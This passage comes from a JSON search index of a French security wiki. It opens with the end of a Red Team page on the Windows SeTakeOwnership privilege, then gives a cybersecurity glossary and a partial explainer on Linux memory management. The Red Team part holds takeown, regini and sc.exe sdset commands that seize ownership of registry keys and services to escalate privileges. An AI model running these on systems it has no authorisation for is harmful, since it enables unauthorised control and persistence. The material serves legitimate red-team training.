d'acc\u00e8s complets au fichier`\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-et-modifier-les-acls-dune-cle-de-registre","title":"S'approprier et modifier les ACLs d'une cl\u00e9 de registre","text":"<pre><code># Prendre la propri\u00e9t\u00e9 de la cl\u00e9 de registre \ntakeown /f 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\example'  \n# Attribuer les droits d'acc\u00e8s complets \nregini /grant=administrators=f 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\example'`\n</code></pre>"},{"location":"Red%20Team/Windows/Privil%C3%A8ges/SeTakeOwnership/#sapproprier-un-service","title":"S'approprier un service","text":"<pre><code># Utiliser sc.exe pour reconfigurer le service \nsc.exe sdset [Nom_du_service] D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)`\n</code></pre>"},{"location":"Ressources/Lexique/","title":"Lexique","text":"<p>Actif (Asset) D\u00e9finition : Toute ressource ayant de la valeur pour une organisation et n\u00e9cessitant une protection. Cela peut inclure des donn\u00e9es, du mat\u00e9riel, des logiciels, des infrastructures, la r\u00e9putation, etc.</p> <p>Analyse Comportementale (Behavioral Analysis) D\u00e9finition : Technique de d\u00e9tection qui se concentre sur les actions et les mod\u00e8les d'activit\u00e9 (d'un utilisateur, d'un processus, du trafic r\u00e9seau) plut\u00f4t que sur des signatures sp\u00e9cifiques, afin d'identifier des anomalies potentiellement malveillantes.</p> <p>Analyse Forensique / Investigation Num\u00e9rique (Digital Forensics) D\u00e9finition : Processus d'investigation scientifique visant \u00e0 collecter, analyser et pr\u00e9server des preuves num\u00e9riques (sur des disques durs, m\u00e9moires, logs, etc.) suite \u00e0 un incident de s\u00e9curit\u00e9, souvent dans un but l\u00e9gal ou de compr\u00e9hension de l'attaque.</p> <p>Antivirus (AV) D\u00e9finition : Logiciel con\u00e7u pour d\u00e9tecter, pr\u00e9venir et supprimer les logiciels malveillants (malware), principalement bas\u00e9 sur des signatures de menaces connues. Les versions modernes incluent souvent des analyses heuristiques et comportementales.</p> <p>Attaque par D\u00e9ni de Service (Denial of Service - DoS) D\u00e9finition : Attaque visant \u00e0 rendre une ressource informatique (serveur, service, r\u00e9seau) indisponible pour ses utilisateurs l\u00e9gitimes, g\u00e9n\u00e9ralement en la submergeant de trafic ou de requ\u00eates.</p> <p>Attaque par D\u00e9ni de Service Distribu\u00e9 (Distributed Denial of Service - DDoS) D\u00e9finition : Variante de l'attaque DoS o\u00f9 l'attaque provient de multiples sources compromises (souvent un botnet), rendant la mitigation plus complexe.</p> <p>Attaque par Force Brute (Brute Force Attack) D\u00e9finition : M\u00e9thode d'attaque consistant \u00e0 essayer syst\u00e9matiquement toutes les combinaisons possibles (de mots de passe, de cl\u00e9s de chiffrement) jusqu'\u00e0 trouver la bonne.</p> <p>Attaque par Homme du Milieu (Man-in-the-Middle - MitM) D\u00e9finition : Attaque o\u00f9 l'attaquant s'interpose secr\u00e8tement entre deux parties qui communiquent, interceptant, voire modifiant, leurs \u00e9changes sans qu'elles s'en rendent compte.</p> <p>Authentification (Authentication) D\u00e9finition : Processus de v\u00e9rification de l'identit\u00e9 d\u00e9clar\u00e9e d'un utilisateur, d'un service ou d'un syst\u00e8me. R\u00e9pond \u00e0 la question \"Qui \u00eates-vous ?\".</p> <p>Authentification Multi-Facteurs (Multi-Factor Authentication - MFA) D\u00e9finition : M\u00e9thode d'authentification n\u00e9cessitant la validation d'au moins deux facteurs de v\u00e9rification diff\u00e9rents parmi : quelque chose que l'utilisateur conna\u00eet (mot de passe), quelque chose qu'il poss\u00e8de (t\u00e9l\u00e9phone, token), et quelque chose qu'il est (biom\u00e9trie).</p> <p>Autorisation (Authorization) D\u00e9finition : Processus d\u00e9terminant les droits d'acc\u00e8s d'une identit\u00e9 authentifi\u00e9e \u00e0 des ressources sp\u00e9cifiques. R\u00e9pond \u00e0 la question \"Qu'avez-vous le droit de faire ?\".</p> <p>Bac \u00e0 Sable (Sandbox) D\u00e9finition : Environnement d'ex\u00e9cution isol\u00e9 et contr\u00f4l\u00e9 o\u00f9 des logiciels potentiellement dangereux peuvent \u00eatre ex\u00e9cut\u00e9s et analys\u00e9s sans risque pour le syst\u00e8me h\u00f4te ou le r\u00e9seau.</p> <p>Bastion (Bastion Host / Jump Host) D\u00e9finition : Serveur s\u00e9curis\u00e9 et renforc\u00e9, servant de point d'acc\u00e8s unique et contr\u00f4l\u00e9 depuis une zone non s\u00e9curis\u00e9e vers une zone s\u00e9curis\u00e9e du r\u00e9seau.</p> <p>Botnet D\u00e9finition : R\u00e9seau de machines compromises (ordinateurs, objets connect\u00e9s...) contr\u00f4l\u00e9es \u00e0 distance par un attaquant (le \"botmaster\"), souvent utilis\u00e9 pour lancer des attaques DDoS, envoyer du spam, ou miner des cryptomonnaies.</p> <p>Chasse aux Menaces (Threat Hunting) D\u00e9finition : Processus proactif et it\u00e9ratif de recherche de menaces ou d'attaquants d\u00e9j\u00e0 pr\u00e9sents dans un r\u00e9seau mais non d\u00e9tect\u00e9s par les outils de s\u00e9curit\u00e9 automatis\u00e9s.</p> <p>Chiffrement (Encryption) D\u00e9finition : Processus de transformation de donn\u00e9es (texte clair) en un format illisible (texte chiffr\u00e9) \u00e0 l'aide d'un algorithme et d'une cl\u00e9, afin d'en assurer la confidentialit\u00e9. Seul celui qui poss\u00e8de la cl\u00e9 de d\u00e9chiffrement peut retrouver les donn\u00e9es originales.</p> <p>Confidentialit\u00e9, Int\u00e9grit\u00e9, Disponibilit\u00e9 (Confidentiality, Integrity, Availability - CIA Triad) D\u00e9finition : Mod\u00e8le fondamental de la s\u00e9curit\u00e9 de l'information.     * Confidentialit\u00e9 : Assurer que l'information n'est accessible qu'aux personnes autoris\u00e9es.     * Int\u00e9grit\u00e9 : Garantir que l'information est exacte, compl\u00e8te et n'a pas \u00e9t\u00e9 modifi\u00e9e de mani\u00e8re non autoris\u00e9e.     * Disponibilit\u00e9 : Assurer que l'information et les syst\u00e8mes sont accessibles aux utilisateurs autoris\u00e9s quand ils en ont besoin.</p> <p>Contr\u00f4le d'Acc\u00e8s (Access Control) D\u00e9finition : Ensemble des m\u00e9canismes et politiques visant \u00e0 restreindre l'acc\u00e8s aux ressources (syst\u00e8mes, donn\u00e9es) uniquement aux entit\u00e9s autoris\u00e9es.</p> <p>Contournement de D\u00e9fenses (Defense Evasion) D\u00e9finition : Techniques utilis\u00e9es par les attaquants pour \u00e9viter d'\u00eatre d\u00e9tect\u00e9s par les mesures de s\u00e9curit\u00e9 (antivirus, EDR, IDS/IPS). Exemples : obfuscation de code, utilisation de chiffrement, modification de signatures.</p> <p>Credential Stuffing D\u00e9finition : Attaque automatis\u00e9e consistant \u00e0 utiliser des listes d'identifiants et mots de passe vol\u00e9s (souvent issus de fuites de donn\u00e9es d'autres services) pour tenter de se connecter \u00e0 de nombreux comptes sur un service cible.</p> <p>Cross-Site Scripting (XSS) D\u00e9finition : Vuln\u00e9rabilit\u00e9 web permettant \u00e0 un attaquant d'injecter du code malveillant (g\u00e9n\u00e9ralement du JavaScript) dans une page web vue par d'autres utilisateurs. Peut servir \u00e0 voler des cookies de session, rediriger des utilisateurs, etc.</p> <p>D\u00e9fense en Profondeur (Defense in Depth) D\u00e9finition : Strat\u00e9gie de s\u00e9curit\u00e9 consistant \u00e0 mettre en place plusieurs couches de d\u00e9fenses successives, de sorte que si une couche \u00e9choue, une autre peut prendre le relais pour arr\u00eater ou ralentir l'attaquant.</p> <p>Endpoint Detection and Response (EDR) D\u00e9finition : Solution de s\u00e9curit\u00e9 pour les terminaux (ordinateurs, serveurs) qui surveille en continu, collecte des donn\u00e9es d'activit\u00e9, analyse les menaces (souvent via analyse comportementale et IA) et fournit des capacit\u00e9s de r\u00e9ponse aux incidents (isolation, rem\u00e9diation).</p> <p>Exploit D\u00e9finition : Morceau de code, s\u00e9quence de commandes ou donn\u00e9es sp\u00e9cifiques qui tire parti d'une vuln\u00e9rabilit\u00e9 dans un syst\u00e8me ou un logiciel pour provoquer un comportement impr\u00e9vu ou non d\u00e9sir\u00e9, souvent pour obtenir un acc\u00e8s non autoris\u00e9 ou ex\u00e9cuter du code.</p> <p>Exfiltration (Data Exfiltration) D\u00e9finition : Transfert non autoris\u00e9 de donn\u00e9es depuis un syst\u00e8me ou un r\u00e9seau vers une destination externe contr\u00f4l\u00e9e par l'attaquant.</p> <p>Faille Zero-Day (Zero-Day Vulnerability / 0-day) D\u00e9finition : Vuln\u00e9rabilit\u00e9 de s\u00e9curit\u00e9 qui est inconnue de l'\u00e9diteur du logiciel ou du public, et pour laquelle aucun correctif (patch) n'existe encore. Les exploits ciblant ces failles sont appel\u00e9s \"exploits zero-day\".</p> <p>Fonction de Hachage (Hash Function) D\u00e9finition : Algorithme math\u00e9matique qui transforme une quantit\u00e9 de donn\u00e9es d'entr\u00e9e (de taille variable) en une cha\u00eene de caract\u00e8res de taille fixe (le \"hash\" ou \"condensat\"). Utilis\u00e9 pour v\u00e9rifier l'int\u00e9grit\u00e9 des donn\u00e9es (si les donn\u00e9es changent, le hash change) et stocker les mots de passe de mani\u00e8re s\u00e9curis\u00e9e (on stocke le hash, pas le mot de passe en clair). Exemples : SHA-256, MD5 (obsol\u00e8te).</p> <p>Hame\u00e7onnage / Filoutage (Phishing) D\u00e9finition : Technique d'ing\u00e9nierie sociale visant \u00e0 tromper un utilisateur pour qu'il divulgue des informations sensibles (identifiants, mots de passe, informations bancaires) en se faisant passer pour une entit\u00e9 de confiance (banque, service en ligne) via email, SMS (smishing) ou t\u00e9l\u00e9phone (vishing).</p> <p>Hame\u00e7onnage Cibl\u00e9 (Spear Phishing) D\u00e9finition : Variante du phishing o\u00f9 l'attaque est sp\u00e9cifiquement cibl\u00e9e sur une personne ou un groupe restreint, utilisant des informations personnelles ou contextuelles pour rendre le message plus cr\u00e9dible.</p> <p>Hame\u00e7onnage Cibl\u00e9 de Haut Niveau / Chasse \u00e0 la Baleine (Whaling) D\u00e9finition : Spear phishing visant sp\u00e9cifiquement des cadres dirigeants ou des personnalit\u00e9s importantes (\"baleines\") au sein d'une organisation.</p> <p>Honeypot / Pot de Miel D\u00e9finition : Syst\u00e8me ou ressource informatique d\u00e9lib\u00e9r\u00e9ment expos\u00e9 et configur\u00e9 pour attirer et pi\u00e9ger les attaquants, afin d'\u00e9tudier leurs m\u00e9thodes, collecter des informations sur les menaces ou d\u00e9tourner leur attention des syst\u00e8mes r\u00e9els.</p> <p>Ing\u00e9nierie Inverse / R\u00e9tro-ing\u00e9nierie (Reverse Engineering) D\u00e9finition : Processus d'analyse d'un syst\u00e8me, d'un logiciel ou d'un composant pour comprendre sa conception, son fonctionnement interne ou ses algorithmes, souvent \u00e0 partir du code compil\u00e9 ou de l'objet physique. Utilis\u00e9 pour l'analyse de malware, la recherche de vuln\u00e9rabilit\u00e9s, ou la compr\u00e9hension de protocoles.</p> <p>Ing\u00e9nierie Sociale (Social Engineering) D\u00e9finition : Art de manipuler psychologiquement les personnes pour les inciter \u00e0 effectuer des actions ou \u00e0 divulguer des informations confidentielles. Le phishing est une forme d'ing\u00e9nierie sociale.</p> <p>Injection SQL (SQL Injection - SQLi) D\u00e9finition : Vuln\u00e9rabilit\u00e9 web permettant \u00e0 un attaquant d'injecter des commandes SQL malveillantes dans les requ\u00eates envoy\u00e9es par une application \u00e0 sa base de donn\u00e9es. Peut permettre de lire, modifier ou supprimer des donn\u00e9es, voire de prendre le contr\u00f4le du serveur de base de donn\u00e9es.</p> <p>Intrusion Detection System (IDS) / Intrusion Prevention System (IPS) D\u00e9finition :     * IDS : Syst\u00e8me qui surveille le trafic r\u00e9seau ou l'activit\u00e9 syst\u00e8me \u00e0 la recherche de signes d'activit\u00e9s malveillantes ou de violations de politiques, et g\u00e9n\u00e8re des alertes.     * IPS : Similaire \u00e0 l'IDS, mais capable en plus de bloquer activement le trafic ou l'activit\u00e9 d\u00e9tect\u00e9e comme malveillante.</p> <p>Journalisation / Logs (Logging) D\u00e9finition : Enregistrement chronologique des \u00e9v\u00e9nements survenant dans un syst\u00e8me ou une application. Essentiel pour la surveillance, le d\u00e9pannage, l'audit et l'analyse forensique.</p> <p>Logiciel Malveillant / Maliciel (Malware - Malicious Software) D\u00e9finition : Terme g\u00e9n\u00e9rique d\u00e9signant tout logiciel con\u00e7u dans le but de nuire \u00e0 un syst\u00e8me informatique, de voler des donn\u00e9es ou de perturber son fonctionnement. Inclut les virus, vers, chevaux de Troie, ransomwares, spywares, etc.     * Virus : Malware qui s'attache \u00e0 un programme l\u00e9gitime et se propage lorsque ce programme est ex\u00e9cut\u00e9.     * Ver (Worm) : Malware autonome qui se propage activement sur les r\u00e9seaux en exploitant des vuln\u00e9rabilit\u00e9s, sans n\u00e9cessiter d'interaction utilisateur ou de programme h\u00f4te.     * Cheval de Troie (Trojan Horse) : Malware d\u00e9guis\u00e9 en logiciel l\u00e9gitime ou utile pour tromper l'utilisateur et l'inciter \u00e0 l'installer. Ne se propage g\u00e9n\u00e9ralement pas de lui-m\u00eame.     * Ran\u00e7ongiciel / Logiciel ran\u00e7onneur (Ransomware) : Malware qui chiffre les fichiers de la victime ou bloque l'acc\u00e8s au syst\u00e8me, puis exige une ran\u00e7on en \u00e9change de la cl\u00e9 de d\u00e9chiffrement ou du d\u00e9blocage.     * Logiciel Espion (Spyware) : Malware qui collecte secr\u00e8tement des informations sur l'utilisateur ou son activit\u00e9 (frappes clavier, sites visit\u00e9s, identifiants) et les envoie \u00e0 l'attaquant.</p> <p>Mouvement Lat\u00e9ral (Lateral Movement) D\u00e9finition : Techniques utilis\u00e9es par un attaquant, apr\u00e8s avoir compromis une premi\u00e8re machine dans un r\u00e9seau, pour se d\u00e9placer et acc\u00e9der \u00e0 d'autres syst\u00e8mes au sein de ce m\u00eame r\u00e9seau, souvent dans le but d'atteindre des cibles de plus grande valeur ou d'\u00e9tendre son contr\u00f4le.</p> <p>Pare-feu / Coupe-feu (Firewall) D\u00e9finition : Dispositif mat\u00e9riel ou logiciel qui contr\u00f4le le trafic r\u00e9seau entrant et sortant en fonction de r\u00e8gles de s\u00e9curit\u00e9 pr\u00e9d\u00e9finies, agissant comme une barri\u00e8re entre un r\u00e9seau de confiance et un r\u00e9seau non fiable (comme Internet).</p> <p>Patch / Correctif D\u00e9finition : Morceau de code logiciel con\u00e7u pour corriger un bug, une vuln\u00e9rabilit\u00e9 de s\u00e9curit\u00e9 ou am\u00e9liorer les fonctionnalit\u00e9s d'un programme existant. La gestion des correctifs (Patch Management) est un processus cl\u00e9 de la s\u00e9curit\u00e9.</p> <p>Payload / Charge Utile D\u00e9finition : Partie d'un malware ou d'un exploit qui ex\u00e9cute l'action malveillante principale (ex: chiffrement des fichiers pour un ransomware, ouverture d'un shell distant, vol de donn\u00e9es).</p> <p>Pentest / Test d'Intrusion (Penetration Testing) D\u00e9finition : Simulation contr\u00f4l\u00e9e d'une attaque informatique sur un syst\u00e8me, un r\u00e9seau ou une application web, r\u00e9alis\u00e9e avec l'autorisation du propri\u00e9taire, dans le but d'identifier les vuln\u00e9rabilit\u00e9s exploitables avant qu'un attaquant r\u00e9el ne le fasse.</p> <p>Persistance (Persistence) D\u00e9finition : Techniques utilis\u00e9es par un attaquant pour maintenir son acc\u00e8s \u00e0 un syst\u00e8me compromis m\u00eame apr\u00e8s un red\u00e9marrage ou une d\u00e9connexion. Exemples : ajout de t\u00e2ches planifi\u00e9es, modification de services, cl\u00e9s de registre \"Run\".</p> <p>Posture de S\u00e9curit\u00e9 (Security Posture) D\u00e9finition : \u00c9tat global de la s\u00e9curit\u00e9 d'une organisation, incluant ses politiques, ses contr\u00f4les techniques, la sensibilisation des utilisateurs, sa capacit\u00e9 de d\u00e9tection et de r\u00e9ponse. \u00c9valuation de sa capacit\u00e9 \u00e0 se d\u00e9fendre contre les menaces.</p> <p>Principe du Moindre Privil\u00e8ge (Principle of Least Privilege - PoLP) D\u00e9finition : Concept de s\u00e9curit\u00e9 selon lequel un utilisateur, un processus ou un programme ne doit disposer que des droits et permissions minimums strictement n\u00e9cessaires pour accomplir sa t\u00e2che l\u00e9gitime, et ce, pour la dur\u00e9e la plus courte possible.</p> <p>Privilege Escalation / \u00c9l\u00e9vation de Privil\u00e8ges D\u00e9finition : Processus par lequel un attaquant, ayant obtenu un acc\u00e8s initial avec des droits limit\u00e9s sur un syst\u00e8me, exploite une vuln\u00e9rabilit\u00e9 ou une mauvaise configuration pour obtenir des privil\u00e8ges plus \u00e9lev\u00e9s (ex: passer d'un utilisateur standard \u00e0 Administrateur ou SYSTEM).</p> <p>Red Team / Blue Team D\u00e9finition :     * Red Team : \u00c9quipe qui simule les attaquants (adversaires) pour tester les d\u00e9fenses d'une organisation de mani\u00e8re r\u00e9aliste.     * Blue Team : \u00c9quipe responsable de la d\u00e9fense de l'organisation, de la d\u00e9tection et de la r\u00e9ponse aux incidents.     * Purple Team : Exercice ou fonction visant \u00e0 am\u00e9liorer la collaboration et le partage d'informations entre la Red Team et la Blue Team.</p> <p>R\u00e9ponse \u00e0 Incident (Incident Response - IR) D\u00e9finition : Processus organis\u00e9 et structur\u00e9 suivi par une organisation pour g\u00e9rer les cons\u00e9quences d'un incident de s\u00e9curit\u00e9 (attaque, violation de donn\u00e9es). Inclut la pr\u00e9paration, l'identification, le confinement, l'\u00e9radication, la r\u00e9cup\u00e9ration et les le\u00e7ons apprises.</p> <p>Risque (Risk) D\u00e9finition : Probabilit\u00e9 qu'une menace exploite une vuln\u00e9rabilit\u00e9 d'un actif, et l'impact r\u00e9sultant pour l'organisation. Souvent exprim\u00e9 comme Risque = Menace x Vuln\u00e9rabilit\u00e9 x Impact.</p> <p>Security Information and Event Management (SIEM) D\u00e9finition : Solution logicielle qui collecte, agr\u00e8ge et analyse les journaux (logs) et les \u00e9v\u00e9nements de s\u00e9curit\u00e9 provenant de diverses sources (serveurs, firewalls, IDS, applications...) pour fournir une vue centralis\u00e9e, d\u00e9tecter les menaces potentielles, g\u00e9n\u00e9rer des alertes et faciliter les investigations.</p> <p>Shellcode D\u00e9finition : Petite portion de code machine (assembleur) con\u00e7ue pour \u00eatre inject\u00e9e dans un processus vuln\u00e9rable (souvent via un exploit de d\u00e9passement de tampon) afin d'ex\u00e9cuter des commandes arbitraires, typiquement pour ouvrir un shell (une interface en ligne de commande) distant donnant le contr\u00f4le \u00e0 l'attaquant.</p> <p>Signature (Signature) D\u00e9finition : Mod\u00e8le ou motif unique (s\u00e9quence d'octets, hash de fichier, r\u00e8gle de trafic) associ\u00e9 \u00e0 une menace connue (malware, attaque r\u00e9seau). Les outils de d\u00e9tection bas\u00e9s sur les signatures (comme les antivirus traditionnels) comparent les donn\u00e9es analys\u00e9es \u00e0 une base de signatures connues.</p> <p>Surface d'Attaque (Attack Surface) D\u00e9finition : Ensemble des points d'entr\u00e9e potentiels (interfaces, protocoles, services, API, etc.) qu'un attaquant peut utiliser pour tenter d'exploiter des vuln\u00e9rabilit\u00e9s et compromettre un syst\u00e8me ou un r\u00e9seau. R\u00e9duire la surface d'attaque est un objectif cl\u00e9 de la s\u00e9curit\u00e9.</p> <p>Threat / Menace D\u00e9finition : Tout \u00e9v\u00e9nement ou acteur potentiel (attaquant, malware, catastrophe naturelle, erreur humaine) susceptible de causer un dommage \u00e0 un actif en exploitant une vuln\u00e9rabilit\u00e9.</p> <p>Vuln\u00e9rabilit\u00e9 (Vulnerability) D\u00e9finition : Faiblesse dans la conception, l'impl\u00e9mentation, la configuration ou la gestion d'un syst\u00e8me ou d'un processus, qui peut \u00eatre exploit\u00e9e par une menace pour causer un dommage.</p>"},{"location":"Ressources/Linux/RAM/","title":"RAM","text":"<p>1. Introduction</p> <p>Comme sous Windows, la M\u00e9moire Vive (RAM) sous Linux sert de stockage rapide et volatile pour les processus en cours et leurs donn\u00e9es. Le noyau Linux poss\u00e8de un sous-syst\u00e8me de gestion de la m\u00e9moire (Memory Management - MM) sophistiqu\u00e9 dont les objectifs principaux sont l'efficacit\u00e9, la rapidit\u00e9, et la capacit\u00e9 \u00e0 supporter une grande vari\u00e9t\u00e9 de charges de travail, tout en maximisant l'utilisation de la pr\u00e9cieuse RAM physique. Une caract\u00e9ristique distinctive de Linux est son utilisation agressive de la RAM libre pour le cache disque (Page Cache).</p> <p>2. Concepts Fondamentaux</p> <ul> <li> <p>M\u00e9moire Virtuelle (Virtual Memory) :</p> <ul> <li>Linux utilise \u00e9galement le concept d'espace d'adressage virtuel priv\u00e9 pour chaque processus, offrant isolation et flexibilit\u00e9. La taille de cet espace d\u00e9pend de l'architecture (32 ou 64 bits).</li> <li>Le noyau maintient une structure <code>mm_struct</code> pour chaque processus afin de d\u00e9crire son espace d'adressage virtuel.</li> <li>Les avantages (isolation, contigu\u00eft\u00e9 apparente, d\u00e9passement de la RAM physique) sont similaires \u00e0 ceux de Windows.</li> </ul> </li> <li> <p>M\u00e9moire Physique et Zones (Physical Memory &amp; Zones) :</p> <ul> <li>La RAM physique est divis\u00e9e en cadres de page (Page Frames), g\u00e9n\u00e9ralement de 4 Ko.</li> <li>Pour g\u00e9rer les diff\u00e9rentes capacit\u00e9s d'adressage du mat\u00e9riel (particuli\u00e8rement pertinent sur les architectures 32 bits), Linux peut diviser la m\u00e9moire physique en Zones :<ul> <li><code>ZONE_DMA</code> / <code>ZONE_DMA32</code> : M\u00e9moire adressable par les p\u00e9riph\u00e9riques ayant des limitations DMA (Direct Memory Access).</li> <li><code>ZONE_NORMAL</code> : M\u00e9moire directement mapp\u00e9e par le noyau.</li> <li><code>ZONE_HIGHMEM</code> (principalement 32 bits) : M\u00e9moire non directement mapp\u00e9e en permanence dans l'espace d'adressage du noyau, n\u00e9cessitant des mappages temporaires. Sur les syst\u00e8mes 64 bits, la distinction est moins marqu\u00e9e, <code>ZONE_NORMAL</code> couvrant souvent la majorit\u00e9 de la RAM.</li> </ul> </li> <li>Le noyau utilise l'algorithme Buddy Allocator pour g\u00e9rer les cadres de pages physiques libres. Cet algorithme maintient des listes de blocs de pages libres de tailles exponentielles (1, 2, 4, 8... pages contigu\u00ebs), ce qui permet d'allouer et de lib\u00e9rer efficacement des blocs de m\u00e9moire physique de tailles variables tout en limitant la fragmentation externe.</li> </ul> </li> <li> <p>Pagination (Paging) :</p> <ul> <li>Le m\u00e9canisme de traduction des adresses virtuelles en adresses physiques est similaire \u00e0 Windows, utilisant des Tables de Pages (Page Tables) hi\u00e9rarchiques (typiquement 4 ou 5 niveaux sur x86-64 : PGD, P4D, PUD, PMD, PTE).</li> <li>Chaque processus poss\u00e8de ses propres tables de pages. Le TLB (Translation Lookaside Buffer) du CPU est utilis\u00e9 pour mettre en cache les traductions r\u00e9centes.</li> <li>Une tentative d'acc\u00e8s \u00e0 une page virtuelle non mapp\u00e9e \u00e0 un cadre physique provoque une faute de page (Page Fault), g\u00e9r\u00e9e par le noyau.</li> </ul> </li> <li> <p>Espace d'\u00c9change (Swap Space) :</p> <ul> <li>L'\u00e9quivalent Linux du fichier d'\u00e9change Windows. Il peut s'agir d'une partition disque d\u00e9di\u00e9e (plus courant traditionnellement) ou d'un fichier swap.</li> <li>Lorsque la pression m\u00e9moire est forte, le noyau peut d\u00e9placer des pages moins utilis\u00e9es (g\u00e9n\u00e9ralement des pages anonymes, c'est-\u00e0-dire non associ\u00e9es \u00e0 un fichier) de la RAM vers l'espace d'\u00e9change (swapping out).</li> <li>Si une page \"swapp\u00e9e\" est acc\u00e9d\u00e9e, une faute de page se produit, et le noyau la recharge depuis le swap vers la RAM (swapping in).</li> <li>Le param\u00e8tre syst\u00e8me <code>vm.swappiness</code> (valeur de 0 \u00e0 100) influence la propension du noyau \u00e0 utiliser le swap (valeur basse = pr\u00e9f\u00e8re lib\u00e9rer le page cache, valeur haute = pr\u00e9f\u00e8re swapper les pages anonymes).</li> </ul> </li> <li> <p>Cache de Pages (Page Cache) :</p> <ul> <li>C'est un concept central dans la gestion m\u00e9moire de Linux. Le noyau utilise de mani\u00e8re tr\u00e8s agressive toute la RAM physique \"libre\" pour mettre en cache les donn\u00e9es lues depuis ou \u00e9crites vers les p\u00e9riph\u00e9riques de stockage (fichiers, ex\u00e9cutables, biblioth\u00e8ques).</li> <li>Lorsqu'un fichier est lu, ses donn\u00e9es sont charg\u00e9es dans le Page Cache. Les lectures suivantes du m\u00eame fichier seront servies directement depuis la RAM (beaucoup plus rapide) tant que les pages sont dans le cache.</li> <li>Les \u00e9critures sont souvent mises en cache \u00e9galement (write-back cache) et \u00e9crites sur disque de mani\u00e8re asynchrone.</li> <li>Important : La m\u00e9moire utilis\u00e9e par le Page Cache est consid\u00e9r\u00e9e comme \"disponible\" (<code>available</code> dans la commande <code>free</code>). Si une application a besoin de plus de m\u00e9moire, le noyau peut rapidement r\u00e9cup\u00e9rer l'espace occup\u00e9 par le Page Cache (en \u00e9cartant les pages les moins utiles). C'est pourquoi il est normal sous Linux de voir une faible quantit\u00e9 de m\u00e9moire \"free\" mais une grande quantit\u00e9 de m\u00e9moire \"buff/cache\" ou \"available\".</li> </ul> </li> <li> <p>Cache Tampon (Buffer Cache) :</p> <ul> <li>Historiquement distinct du Page Cache, il servait \u00e0 mettre en cache les m\u00e9tadonn\u00e9es des syst\u00e8mes de fichiers et les blocs bruts des p\u00e9riph\u00e9riques.</li> <li>Aujourd'hui, il est largement int\u00e9gr\u00e9 au Page Cache, bien que le terme \"buffers\" apparaisse encore dans certains outils (<code>free</code>). Il repr\u00e9sente essentiellement le cache pour les op\u00e9rations li\u00e9es aux blocs de p\u00e9riph\u00e9riques.</li> </ul> </li> <li> <p>Allocateur Slab (Slab Allocator) :</p> <ul> <li>Le noyau alloue et lib\u00e8re tr\u00e8s fr\u00e9quemment de nombreuses petites structures de donn\u00e9es (inodes, descripteurs de fichiers, descripteurs de processus...). Utiliser directement le Buddy Allocator (qui g\u00e8re des pages enti\u00e8res) pour ces petites allocations serait inefficace et entra\u00eenerait une fragmentation interne importante.</li> <li>L'allocateur Slab g\u00e8re des \"caches\" d'objets de m\u00eame type. Il obtient des pages compl\u00e8tes (slabs) du Buddy Allocator et les d\u00e9coupe en objets de taille fixe. Quand le noyau a besoin d'un objet, il le prend dans le cache slab correspondant ; quand il le lib\u00e8re, l'objet retourne dans le cache slab pour \u00eatre r\u00e9utilis\u00e9 rapidement.</li> <li>Il existe plusieurs impl\u00e9mentations : SLAB (l'original), SLUB (plus simple et performant, souvent par d\u00e9faut), SLOB (optimis\u00e9 pour les syst\u00e8mes avec tr\u00e8s peu de m\u00e9moire).</li> </ul> </li> <li> <p>Pagination \u00e0 la Demande (Demand Paging) :</p> <ul> <li>Lorsqu'un programme est lanc\u00e9, ses pages de code et de donn\u00e9es ne sont g\u00e9n\u00e9ralement pas toutes charg\u00e9es en RAM imm\u00e9diatement. Elles ne sont charg\u00e9es depuis le disque (via le Page Cache) que lorsqu'elles sont acc\u00e9d\u00e9es pour la premi\u00e8re fois, d\u00e9clenchant une faute de page mineure.</li> </ul> </li> <li> <p>Copie sur \u00c9criture (Copy-on-Write - CoW) :</p> <ul> <li>Optimisation utilis\u00e9e notamment lors de l'appel syst\u00e8me <code>fork()</code>, qui cr\u00e9e un nouveau processus (enfant) comme copie du processus parent.</li> <li>Au lieu de copier imm\u00e9diatement toutes les pages m\u00e9moire du parent vers l'enfant (ce qui serait co\u00fbteux), les deux processus partagent initialement les m\u00eames cadres de pages physiques, marqu\u00e9s en lecture seule (Read-Only).</li> <li>Si l'un des processus (parent ou enfant) tente ensuite d'\u00e9crire sur une page partag\u00e9e, une faute de page se produit. Le noyau intercepte la faute, cr\u00e9e une copie physique de la page sp\u00e9cifique, met \u00e0 jour la table de pages du processus qui a \u00e9crit pour pointer vers la nouvelle copie (maintenant en lecture/\u00e9criture), et laisse l'\u00e9criture se faire. L'autre processus continue d'utiliser la page originale (qui peut rester partag\u00e9e si d'autres enfants existent).</li> </ul> </li> <li> <p>Pages \u00c9normes (Huge Pages / Transparent Huge Pages - THP) :</p> <ul> <li>Pour r\u00e9duire la charge sur le TLB et am\u00e9liorer les performances des applications manipulant de grandes quantit\u00e9s de m\u00e9moire, Linux supporte l'utilisation de pages de plus grande taille (ex: 2 Mo ou 1 Go au lieu de 4 Ko).</li> <li>Huge Pages n\u00e9cessite une configuration explicite par l'administrateur et les applications.</li> <li>Transparent Huge Pages (THP) est un m\u00e9canisme o\u00f9 le noyau tente d'utiliser automatiquement des Huge Pages pour les processus sans modification applicative. C'est souvent activ\u00e9 par d\u00e9faut mais peut parfois causer des latences ou une utilisation m\u00e9moire accrue dans certains cas d'usage.</li> </ul> </li> <li> <p>Tue-M\u00e9moire / OOM Killer (Out Of Memory Killer) :</p> <ul> <li>Que se passe-t-il si le syst\u00e8me manque cruellement de m\u00e9moire (RAM et Swap \u00e9puis\u00e9s) ? Pour \u00e9viter un blocage complet du syst\u00e8me (kernel panic), le noyau Linux active l'OOM Killer.</li> <li>Ce m\u00e9canisme choisit un processus \"sacrificiel\" \u00e0 tuer pour lib\u00e9rer de la m\u00e9moire. Le choix est bas\u00e9 sur un score (<code>oom_score</code>) calcul\u00e9 pour chaque processus, p\u00e9nalisant g\u00e9n\u00e9ralement les processus consommant beaucoup de m\u00e9moire, fonctionnant depuis peu, ou ayant une faible priorit\u00e9.</li> <li>Bien qu'il sauve le syst\u00e8me d'un crash total, l'intervention de l'OOM Killer indique souvent un probl\u00e8me de sous-dimensionnement m\u00e9moire ou une fuite m\u00e9moire applicative.</li> </ul> </li> </ul> <p>3. Algorithmes et 